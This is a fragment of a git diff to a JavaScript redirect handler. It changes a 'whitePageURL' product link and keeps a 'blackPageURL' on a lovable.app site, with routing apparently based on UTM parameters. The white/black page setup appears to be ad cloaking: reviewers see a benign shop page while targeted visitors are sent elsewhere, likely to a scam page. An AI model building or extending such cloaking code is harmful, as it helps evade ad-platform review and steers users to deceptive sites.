@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://connectwithtaar.com/products/fusion-mighty-188w";
+    const whitePageURL = "https://www.soundoflife.media/product-page/sol-men-s-athletic-shoes-1v";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
